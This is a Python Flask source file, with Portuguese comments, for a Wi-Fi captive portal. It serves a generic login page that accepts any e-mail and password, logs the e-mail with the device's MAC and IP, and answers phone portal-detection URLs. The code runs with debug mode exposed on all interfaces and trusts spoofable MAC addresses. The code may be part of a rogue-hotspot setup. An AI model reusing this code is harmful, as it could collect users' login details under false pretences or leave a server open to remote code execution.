from flask import Flask, request, render_template, redirect, url_for, session, jsonify
import os
import re
import subprocess
from functools import wraps
from typing import Dict, Set, Optional

app = Flask(__name__, static_folder='static', template_folder='templates')
app.secret_key = os.urandom(24)

# Armazenamento em memória para sessões autenticadas
authenticated_clients: Dict[str, bool] = {}

def get_client_mac() -> Optional[str]:
    """
    Obtém o endereço MAC do cliente conectado.
    
    Returns:
        Endereço MAC do cliente ou None se não for possível obter
    """
    # Obtém o IP do cliente
    client_ip = request.remote_addr
    
    # Tenta obter o MAC via ARP
    try:
        arp_output = subprocess.check_output(['arp', '-n', client_ip], universal_newlines=True)
        matches = re.search(r'([0-9a-fA-F]{2}(?::[0-9a-fA-F]{2}){5})', arp_output)
        if matches:
            return matches.group(1)
    except Exception:
        pass
    
    return None

def auth_required(f):
    """
    Decorator para exigir autenticação em rotas protegidas.
    """
    @wraps(f)
    def decorated_function(*args, **kwargs):
        client_ip = request.remote_addr
        client_mac = get_client_mac()
        
        # Verifica se o cliente está autenticado
        if client_mac and client_mac in authenticated_clients:
            return f(*args, **kwargs)
        
        # Se não estiver autenticado, redireciona para o login
        return redirect(url_for('login'))
    
    return decorated_function

@app.route('/')
def index():
    """
    Página inicial do portal cativo.
    """
    client_mac = get_client_mac()
    
    # Se o cliente já está autenticado, redireciona para a página de sucesso
    if client_mac and client_mac in authenticated_clients:
        return redirect(url_for('success'))
    
    # Caso contrário, exibe a página de login
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    """
    Página de login do portal cativo.
    """
    error = None
    
    if request.method == 'POST':
        email = request.form.get('email', '')
        password = request.form.get('password', '')
        
        if not email or not password:
            error = "Preencha todos os campos"
        elif not re.match(r"[^@]+@[^@]+\.[^@]+", email):
            error = "Email inválido"
        else:
            # Obter informações do cliente
            client_ip = request.remote_addr
            client_mac = get_client_mac()
            
            if client_mac:
                # Autentica o cliente
                authenticated_clients[client_mac] = True
                
                # Registra a tentativa de login
                from utils.logger import Logger
                logger = Logger()
                logger.log_attempt(client_mac, client_ip, email, "sucesso")
                
                # Redireciona para a página de sucesso
                return redirect(url_for('success'))
            else:
                error = "Não foi possível identificar seu dispositivo"
                
                # Registra a tentativa de login falha
                from utils.logger import Logger
                logger = Logger()
                logger.log_attempt("unknown", client_ip, email, "erro")
    
    return render_template('login.html', error=error)

@app.route('/success')
@auth_required
def success():
    """
    Página de sucesso após login.
    """
    return render_template('success.html')

@app.route('/status')
def status():
    """
    Endpoint para verificar o status do portal cativo.
    """
    client_ip = request.remote_addr
    client_mac = get_client_mac()
    
    status_data = {
        'ip': client_ip,
        'mac': client_mac,
        'authenticated': client_mac in authenticated_clients if client_mac else False,
    }
    
    return jsonify(status_data)

@app.route('/logout')
def logout():
    """
    Página para desconectar um cliente.
    """
    client_mac = get_client_mac()
    
    if client_mac and client_mac in authenticated_clients:
        del authenticated_clients[client_mac]
    
    return redirect(url_for('login'))

# Rota para detectar portal cativo em Android
@app.route('/generate_204')
def generate_204():
    client_mac = get_client_mac()
    
    if client_mac and client_mac in authenticated_clients:
        return '', 204
    else:
        return redirect(url_for('login'))

# Rota para detectar portal cativo em iOS/MacOS
@app.route('/hotspot-detect.html')
def hotspot_detect():
    client_mac = get_client_mac()
    
    if client_mac and client_mac in authenticated_clients:
        return '<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>'
    else:
        return redirect(url_for('login'))

def create_app():
    """
    Cria e configura a aplicação Flask.
    """
    # Garante que o diretório de templates existe
    os.makedirs(os.path.join(os.path.dirname(__file__), 'templates'), exist_ok=True)
    
    # Cria os templates
    _create_login_template()
    _create_success_template()
    
    # Cria o diretório de arquivos estáticos
    os.makedirs(os.path.join(os.path.dirname(__file__), 'static'), exist_ok=True)
    
    return app

def _create_login_template():
    """
    Cria o template da página de login.
    """
    template_dir = os.path.join(os.path.dirname(__file__), 'templates')
    login_template_path = os.path.join(template_dir, 'login.html')
    
    with open(login_template_path, 'w') as f:
        f.write('''<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Portal de Acesso</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: #f5f5f5;
            color: #333;
        }
        .container {
            max-width: 400px;
            margin: 40px auto;
            padding: 20px;
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        h1 {
            text-align: center;
            color: #2c3e50;
            margin-bottom: 30px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
        }
        input {
            width: 100%;
            padding: 10px;
            box-sizing: border-box;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 16px;
        }
        .btn {
            display: block;
            width: 100%;
            padding: 12px;
            background-color: #3498db;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            text-align: center;
        }
        .btn:hover {
            background-color: #2980b9;
        }
        .error {
            color: #e74c3c;
            margin-top: 20px;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Acesso à Internet</h1>
        {% if error %}
        <div class="error">{{ error }}</div>
        {% endif %}
        <form method="post">
            <div class="form-group">
                <label for="email">E-mail:</label>
                <input type="email" id="email" name="email" required>
            </div>
            <div class="form-group">
                <label for="password">Senha:</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit" class="btn">Entrar</button>
        </form>
    </div>
</body>
</html>''')

def _create_success_template():
    """
    Cria o template da página de sucesso.
    """
    template_dir = os.path.join(os.path.dirname(__file__), 'templates')
    success_template_path = os.path.join(template_dir, 'success.html')
    
    with open(success_template_path, 'w') as f:
        f.write('''<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="refresh" content="3;url=https://www.google.com">
    <title>Conectado com Sucesso</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: #f5f5f5;
            color: #333;
            text-align: center;
        }
        .container {
            max-width: 400px;
            margin: 40px auto;
            padding: 20px;
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        h1 {
            color: #2c3e50;
            margin-bottom: 20px;
        }
        p {
            font-size: 16px;
            line-height: 1.6;
        }
        .success-icon {
            color: #27ae60;
            font-size: 64px;
            margin-bottom: 20px;
        }
        .btn {
            display: inline-block;
            margin-top: 20px;
            padding: 10px 20px;
            background-color: #3498db;
            color: white;
            text-decoration: none;
            border-radius: 4px;
        }
        .btn:hover {
            background-color: #2980b9;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="success-icon">✓</div>
        <h1>Conectado com Sucesso!</h1>
        <p>Você está agora conectado à internet.</p>
        <p>Redirecionando para a navegação...</p>
        <a href="https://www.google.com" class="btn">Continuar</a>
    </div>
</body>
</html>''')

if __name__ == '__main__':
    app = create_app()
    app.run(host='0.0.0.0', port=5000, debug=True)
